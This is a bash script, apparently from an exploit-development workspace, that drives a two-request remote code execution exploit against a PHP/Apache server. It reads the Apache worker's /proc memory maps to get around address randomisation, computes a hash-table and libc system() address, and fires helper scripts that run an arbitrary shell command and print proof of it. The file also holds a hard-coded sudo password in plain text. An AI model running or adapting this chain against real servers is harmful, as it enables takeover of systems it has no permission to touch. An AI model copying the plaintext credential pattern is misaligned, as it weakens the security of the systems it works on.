#!/bin/bash
# ASLR-on demo: addresses discovered out-of-band from /proc/<worker>/maps.
# The request chain itself is the calibrated pure-HTTP A/B; only chunk base and
# libc base come from outside. Validates that the two-request layout is
# ASLR-independent.
cd /home/debian/php2shell-work
CMD="${CMD:-id>/tmp/p1}"
echo debian.qwe123 | sudo -S bash -c "apache2ctl -k stop 2>/dev/null; sleep 0.6; pkill -9 apache2; sleep 0.6; pkill -9 gdb; sleep 0.3; ulimit -c unlimited; /usr/sbin/apache2ctl -k start; sleep 0.8" >/dev/null 2>&1
echo debian.qwe123 | sudo -S rm -f /tmp/p1 /tmp/sess_attacksessionid0001 >/dev/null 2>&1
timeout 40 python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7 >/dev/null 2>&1
sleep 0.4
W=$(pgrep -x apache2 | tail -1)
echo debian.qwe123 | sudo -S python3 - "$W" <<'PY' > /tmp/aslr_addrs
import sys
pid=sys.argv[1]
chunk=lib=0
for line in open('/proc/%s/maps'%pid):
    p=line.split()
    a,b=[int(x,16) for x in p[0].split('-')]
    if p[1]=='rw-p' and len(p)<=5 and (b-a)==0x200000 and (a & 0x1fffff)==0:
        chunk=a
    if '/libc.so.6' in line and p[2]=='00000000' and not lib:
        lib=a
print("chunk=0x%x libbase=0x%x ht=0x%x sys=0x%x"%(chunk,lib,chunk+0x6e0d8,lib+0x4c490),file=sys.stderr)
print(hex(chunk+0x6e0d8), hex(lib+0x4c490))
PY
read HT SYS < /tmp/aslr_addrs
echo "worker=$W pers=$(echo debian.qwe123 | sudo -S cat /proc/$W/personality 2>/dev/null) HT=$HT SYS=$SYS"
timeout 20 python3 send_b_rce2.py 16 2 $HT $SYS "$CMD"
sleep 1
echo "--- proof:"
ls -la /tmp/p1 2>&1 && cat /tmp/p1
